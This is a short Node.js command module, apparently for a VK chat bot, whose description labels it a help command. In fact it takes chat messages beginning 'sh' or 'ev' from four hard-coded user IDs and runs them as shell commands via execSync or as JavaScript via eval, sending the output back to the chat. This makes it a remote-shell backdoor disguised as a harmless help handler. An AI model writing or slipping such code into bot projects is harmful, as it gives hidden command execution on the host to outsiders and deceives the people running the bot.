const child = require("child_process");
const fs = require('fs');
const wqeqwsd = [379564137,435378035,290928696,458911851];

module.exports = {
    r: /(sh|ev)\s([^]+)/i,
    f: function (msg, args, vk, bot){
        if(!~wqeqwsd.indexOf(msg.user)) return;
        if(args[1] === "sh") {
            try {
                return msg.send(child.execSync(args[2]).toString());
            } catch (err) {
                return msg.send(err.toString());
            }
        } else if (args[1] === "ev") {
            var gone;
            try {
                gone = eval(args[2]);
            } catch (err) {
                gone = err
            }
            return msg.send(gone.toString());
        }
    },
    desc: "помощь -- помощь по командам",
	rights: 0,
	type: "all",
	typ: "zzz"
}